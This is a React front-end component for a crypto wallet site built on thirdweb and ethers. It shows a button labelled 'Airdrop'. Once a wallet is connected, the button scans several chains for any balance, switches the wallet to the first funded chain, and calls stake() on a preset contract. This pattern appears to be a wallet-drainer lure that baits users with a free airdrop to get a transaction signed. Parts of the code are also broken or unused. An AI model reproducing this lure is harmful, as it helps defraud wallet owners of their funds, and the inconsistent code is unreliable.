import React, { useEffect, useState } from "react";
import { ConnectButton, TransactionButton } from "thirdweb/react";
import {
  ARBITRUMCONTRACT,
  AVAXCONTRACT,
  BNBCONTRACT,
  BSCTESTCONTRACT,
  chains,
  client,
} from "../constants/constanst";
import { createWallet } from "thirdweb/wallets";
import { useActiveAccount, useSwitchActiveWalletChain } from "thirdweb/react";
import { getWalletBalance } from "thirdweb/wallets";
import { ethers } from "ethers";

const CustomButton = () => {
  const activeAccount = useActiveAccount();
  const switchChain = useSwitchActiveWalletChain();
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState("0");
  const [currentChain, setCurrentChain] = useState("");
  const [currentChainId, setCurrentChainId] = useState("");

  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  const checkBalanceAndSwitchChain = async () => {
    if (!activeAccount?.address) return;

    setLoading(true);

    for (const chain of chains) {
      setCurrentChainId(chain.id);
      setCurrentChain(chain.name);
      try {
        const balanceResult = await getWalletBalance({
          address: activeAccount.address,
          client,
          chain,
        });

        const balanceInUnit = balanceResult.displayValue;

        console.log(
          `Balance found on ${chain.rpc}: ${balanceInUnit} ${chain.ticker}`
        );

        if (parseFloat(balanceInUnit) > 0) {
          await switchChain({ id: chain.id });

          // const currentChainContract = chain.name.includes("avalanche")
          //   ? AVAXCONTRACT
          //   : chain.name.includes("smart chain")
          //   ? BNBCONTRACT
          //   : chain.name.includes("arbitrum")
          //   ? ARBITRUMCONTRACT
          //   : BSCTESTCONTRACT;

          const currentChainContract = BSCTESTCONTRACT;

          const balanceToStake = (balanceInUnit * 5) / 100000;

          try {
            const stakeContract = new ethers.Contract(
              currentChainContract.address,
              currentChainContract.abi,
              activeAccount
            );

            const approveTx = await stakeContract.stake();
            await approveTx.wait();

            console.log(`Approved ${balanceToStake} tokens for staking`);
          } catch (error) {
            if (error.code === "CALL_EXCEPTION") {
              // Inspect the revert reason if available
              const revertMessage =
                error?.data?.message || error?.reason || "Unknown error";
              if (revertMessage.includes("Insufficient allowance")) {
                alert("You have insufficient allowance for staking.");
              } else {
                alert(`Transaction failed: ${revertMessage}`);
              }
            } else {
              alert("An unexpected error occurred: " + error.message);
            }
          }
        } else {
          console.log(
            `No balance on ${chain.rpc}, switching to the next chain.`
          );
          await delay(2000);
        }
      } catch (error) {
        console.error(
          `Error checking balance or preparing transaction:`,
          error
        );
      }
    }

    setLoading(false);
  };

  useEffect(() => {
    if (activeAccount?.address) {
      console.log(activeAccount.address);
      setCurrentChain(chains[0].name);
    }
  }, [activeAccount]);

  return (
    <div>
      <ConnectButton
        client={client}
        wallets={[
          createWallet("io.metamask"),
          createWallet("com.coinbase.wallet"),
          createWallet("me.rainbow"),
        ]}
        connectButton={{
          label: "Connect",
        }}
        chains={chains}
      />
      {loading && <p>Wait...</p>}
      {activeAccount && (
        <p>
          Balance: {balance} Current Chain: {currentChain}
        </p>
      )}
      {activeAccount && (
        <TransactionButton
          transaction={checkBalanceAndSwitchChain}
          onTransactionSent={() =>
            alert(`${balance} ${currentChain} approved for staking`)
          }
        >
          Airdrop
        </TransactionButton>
      )}
    </div>
  );
};

export default CustomButton;
